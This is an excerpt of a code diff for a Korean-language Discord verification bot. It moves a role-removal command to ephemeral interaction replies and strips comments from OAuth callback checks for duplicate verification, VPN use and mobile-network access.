-            message.reply('⚠️ 로그 검색 중 오류가 발생했습니다.');
-        }
-        return;
-    }
-
-    // [11] !역할제거 명령어
-    if (content === '!역할제거') {
-        try {
-            const member = message.member;
-            if (!member) return;
+            const member = await guild.members.fetch(userId).catch(() => null);
+            if (!member) return interaction.reply({ content: '❌ 멤버 정보를 찾을 수 없습니다.', ephemeral: true });
 
             const targetRoleId = '1541423418753155135';
             if (!member.roles.cache.has(targetRoleId)) {
-                return message.reply('❌ 제거할 해당 역할이 없습니다.');
+                return interaction.reply({ content: '❌ 제거할 해당 역할이 없습니다.', ephemeral: true });
             }
 
             await member.roles.remove(targetRoleId);
-            message.reply('✅ 지정된 역할이 성공적으로 제거되었습니다!');
+            return interaction.reply({ content: '✅ 지정된 역할이 성공적으로 제거되었습니다!', ephemeral: true });
         } catch (err) {
-            message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
+            return interaction.reply({ content: '⚠️ 오류가 발생했습니다.', ephemeral: true });
         }
-        return;
     }
 });
 
@@ -734,7 +652,6 @@ app.get('/callback', async (req, res) => {
         const userId = userData.id;
         const username = userData.username;
 
-        // 🔍 [중복 인증 체크 및 로그 기록]
         let isDuplicate = false;
         try {
             const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
@@ -753,7 +670,6 @@ app.get('/callback', async (req, res) => {
             }
         } catch (err) {}
 
-        // 🛡️ [VPN 우회 접속 검사]
         try {
             const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy`);
             if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
@@ -761,7 +677,6 @@ app.get('/callback', async (req, res) => {
             }
         } catch (err) {}
 
-        // 🛡️ [모바일 데이터(LTE/5G) 접속 차단 검사]
         try {
             const mobileCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org`);
             if (mobileCheckRes.data.status === 'success') {
